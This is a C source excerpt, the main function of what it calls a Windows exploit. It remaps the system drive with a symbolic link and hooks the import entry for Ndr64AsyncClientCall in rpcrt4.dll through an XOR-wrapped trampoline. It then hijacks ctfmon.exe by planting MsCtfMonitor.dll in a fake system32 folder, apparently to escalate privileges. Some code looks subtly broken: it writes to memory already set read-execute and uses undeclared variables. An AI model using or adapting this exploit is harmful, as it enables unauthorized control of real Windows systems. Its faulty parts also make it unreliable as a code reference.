int main() {
    char buffer[0x100];
    char current_dos_device[0x100];
    wchar_t current_dos_device_w[0x200];
    char system_directory[0x100];
    char drive_to_remap[16];
    char device_to_remap[16];
    wchar_t device_to_remap_w[16];
    void **Ndr64AsyncClientCall_IAT;
    void *Ndr64AsyncClientCall;
    void *hook;
    unsigned __int64 RBX;
    UNICODE_STRING drive;
    HANDLE event;
    DWORD oldProtect;
    int ret;

    // Resolve NtCreateSymbolicLinkObject dynamically
    NtCreateSymbolicLinkObject = (NtCreateSymbolicLinkObject_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSymbolicLinkObject");
    if (!NtCreateSymbolicLinkObject) {
        fprintf(stderr, "Failed to resolve NtCreateSymbolicLinkObject: %lu\n", GetLastError());
        return 1;
    }

    // Resolve RtlInitUnicodeString dynamically
    RtlInitUnicodeString_ptr = (RtlInitUnicodeString_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    if (!RtlInitUnicodeString_ptr) {
        fprintf(stderr, "Failed to resolve RtlInitUnicodeString: %lu\n", GetLastError());
        return 1;
    }

    // Create event object
    event = CreateEventA(NULL, FALSE, FALSE, "ctfmon_owned");
    if (!event) {
        fprintf(stderr, "CreateEvent failed with error: %lu\n", GetLastError());
        return 1;
    }

    // Allocate memory for the trampoline
    hook = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!hook) {
        fprintf(stderr, "VirtualAlloc failed with error: %lu\n", GetLastError());
        return 1;
    }
    memset(hook, 0, 0x1000);

    // XOR encode the trampoline
    char key = 0xAA; // Example key
    xor_encode(trampoline, sizeof(trampoline), key);

    // XOR decode before writing to executable memory
    xor_encode(trampoline, sizeof(trampoline), key);
    memcpy(hook, trampoline, sizeof(trampoline));

    // Change memory protection to PAGE_EXECUTE_READ
    if (!VirtualProtect(hook, 0x1000, PAGE_EXECUTE_READ, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed with error: %lu\n", GetLastError());
        VirtualFree(hook, 0, MEM_RELEASE);
        return 1;
    }

    // Get current DOS device pathname
    get_current_dos_device(sizeof(current_dos_device), current_dos_device);
    printf("[+] Current pathname: %s\n", current_dos_device);

    // Convert to Unicode
    ascii_to_unicode(current_dos_device, current_dos_device_w);

    // Initialize UNICODE_STRING for OBJECT_ATTRIBUTES
    RtlInitUnicodeString_ptr(&s, current_dos_device_w);

    // Get system directory
    GetSystemDirectoryA(system_directory, sizeof(system_directory));

    // Get drive to remap (e.g., "C:")
    strncpy_s(drive_to_remap, sizeof(drive_to_remap), system_directory, 2);
    drive_to_remap[2] = '\0';

    // Get device to remap (e.g., "\\??\\C:")
    sprintf_s(device_to_remap, sizeof(device_to_remap), "\\??\\%s", drive_to_remap);

    // Convert to Unicode
    ascii_to_unicode(device_to_remap, device_to_remap_w);

    // Initialize UNICODE_STRING for drive
    RtlInitUnicodeString_ptr(&drive, device_to_remap_w);

    // Initialize OBJECT_ATTRIBUTES
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &drive, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Initialize buffer (SecurityDescriptor)
    memset(buffer, 0, sizeof(buffer));
    *((unsigned __int64*)(buffer + 0x00)) = 0xc0001; // Example flags, adjust as needed

    // Execute ctfmon.exe to initialize DLLs
    ShellExecuteA(NULL, "open", "ctfmon.exe", "", NULL, SW_SHOW);

    // Get address of Ndr64AsyncClientCall
    Ndr64AsyncClientCall = GetProcAddress(GetModuleHandleA("rpcrt4.dll"), "Ndr64AsyncClientCall");
    if (!Ndr64AsyncClientCall) {
        fprintf(stderr, "Failed to get Ndr64AsyncClientCall: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Ndr64AsyncClientCall: %p\n", (void*)Ndr64AsyncClientCall);

    // Find IAT entry in "rpcrt4.dll"
    Ndr64AsyncClientCall_IAT = (void**)find_iat_entry("rpcrt4.dll", "Ndr64AsyncClientCall");
    if (!Ndr64AsyncClientCall_IAT) {
        fprintf(stderr, "Failed to find IAT entry for Ndr64AsyncClientCall.\n");
        return 1;
    }
    printf("[+] Ndr64AsyncClientCall_IAT: %p\n", (void*)Ndr64AsyncClientCall_IAT);

    // Replace placeholders in the trampoline
    if (!replace_trampoline_value(trampoline, sizeof(trampoline), 0x1111111111111111, (unsigned __int64)&RBX)) {
        printf("Failed to replace 0x1111111111111111 in trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, sizeof(trampoline), 0x2222222222222222, (unsigned __int64)Ndr64AsyncClientCall)) {
        printf("Failed to replace 0x2222222222222222 in trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, sizeof(trampoline), 0x3333333333333333, (unsigned __int64)remap_system_drive)) {
        printf("Failed to replace 0x3333333333333333 in trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, sizeof(trampoline), 0x4444444444444444, (unsigned __int64)&RBX)) {
        printf("Failed to replace 0x4444444444444444 in trampoline.\n");
    }

    // Validate trampoline
    for (unsigned int i = 0; i < sizeof(trampoline); i += sizeof(unsigned __int64)) {
        unsigned __int64 val = *(unsigned __int64*)(trampoline + i);
        if (val == 0x1111111111111111 || val == 0x2222222222222222 ||
            val == 0x3333333333333333 || val == 0x4444444444444444) {
            printf("Placeholder 0x%llx not replaced at offset 0x%X\n", val, i);
        }
    }

    // Write trampoline to hook memory
    memcpy(hook, trampoline, sizeof(trampoline));

    // Hook the IAT entry
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed while unprotecting IAT: %lu\n", GetLastError());
        return 1;
    }
    *Ndr64AsyncClientCall_IAT = hook;
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), oldProtect, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed while restoring IAT protection: %lu\n", GetLastError());
        return 1;
    }

    // User message
    printf("[+] Launching exploit...\n");

    // Create directories
    if (CreateDirectoryA(".\\windows", NULL) == TRUE || GetLastError() == ERROR_ALREADY_EXISTS) {
        // Create System32 subdirectory
        CreateDirectoryA(".\\windows\\system32", NULL);
    } else {
        printf("[-] Error: the exploit doesn't have permissions to create a directory\n");
        return 1;
    }

    // Copy DLL
    if (CopyFileA(".\\MsCtfMonitor.dll", ".\\windows\\system32\\MsCtfMonitor.dll", FALSE) == FALSE) {
        printf("[-] Error copying 'MsCtfMonitor.dll' to '.\\windows\\system32' (the file exists?)\n");
        return 1;
    }

    // Execute target program
    ShellExecuteA(NULL, "open", "ctfmon.exe", "/?", NULL, SW_SHOW);

    // Wait for DLL hijacking
    printf("[+] Waiting for DLL hijacked\n");
    ret = WaitForSingleObject(event, 10000);
    if (ret != WAIT_OBJECT_0) {
        printf("[-] WaitForSingleObject timed out or failed.\n");
    }

    // Close "C:" remapping handle
    CloseHandle(h);

    // Unhook the IAT entry
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed while unprotecting IAT for unhooking: %lu\n", GetLastError());
        return 1;
    }
    *Ndr64AsyncClientCall_IAT = Ndr64AsyncClientCall;
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), oldProtect, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed while restoring IAT protection after unhooking: %lu\n", GetLastError());
        return 1;
    }

    // Final message
    printf("[+] Exploit successful!\n");
    return 0;
}
